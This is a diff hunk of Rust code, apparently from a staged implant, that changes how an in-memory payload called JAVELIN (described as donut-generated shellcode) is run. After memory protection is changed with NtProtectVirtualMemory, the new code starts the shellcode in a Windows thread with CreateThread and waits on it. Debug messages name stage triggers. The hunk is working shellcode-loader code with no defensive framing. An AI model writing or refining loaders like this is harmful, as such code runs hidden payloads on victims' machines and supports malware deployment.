@@ -120,14 +120,42 @@ fn execute_in_memory(payload: &[u8]) -> Result<(), Box<dyn Error>> {
             return Err("NtProtectVirtualMemory failed".into());
         }
 
-        // Step 4: Execute JAVELIN
-        // JAVELIN is expected to be position-independent code
-        // It will handle its own execution and stage orchestration
-        crate::debug_print!("[STAGE_TRIGGER] Transferring execution to JAVELIN");
-        let javelin_entry: extern "C" fn() = std::mem::transmute(base_address);
-        javelin_entry();
-
-        crate::debug_print!("[STAGE_TRIGGER] JAVELIN execution completed");
+        // Step 4: Execute JAVELIN shellcode
+        // JAVELIN is donut-generated position-independent shellcode
+        // We need to execute it properly as shellcode, not as a regular function
+        crate::debug_print!("[STAGE_TRIGGER] Transferring execution to JAVELIN shellcode");
+        
+        // Create a thread to execute the shellcode
+        // This is the correct way to execute donut shellcode
+        #[cfg(target_os = "windows")]
+        {
+            use winapi::um::processthreadsapi::CreateThread;
+            use winapi::um::synchapi::WaitForSingleObject;
+            use winapi::um::winbase::INFINITE;
+            
+            let thread_handle = CreateThread(
+                std::ptr::null_mut(),  // Default security
+                0,                      // Default stack size  
+                Some(std::mem::transmute(base_address)),  // Thread function
+                std::ptr::null_mut(),  // No parameter
+                0,                      // Run immediately
+                std::ptr::null_mut(),  // Don't need thread ID
+            );
+            
+            if thread_handle.is_null() {
+                return Err("Failed to create thread for shellcode execution".into());
+            }
+            
+            // Wait for the shellcode thread to complete
+            WaitForSingleObject(thread_handle, INFINITE);
+        }
+        
+        #[cfg(not(target_os = "windows"))]
+        {
+            return Err("Shellcode execution only supported on Windows".into());
+        }
+        
+        crate::debug_print!("[STAGE_TRIGGER] JAVELIN shellcode execution completed");
     }
 
     Ok(())
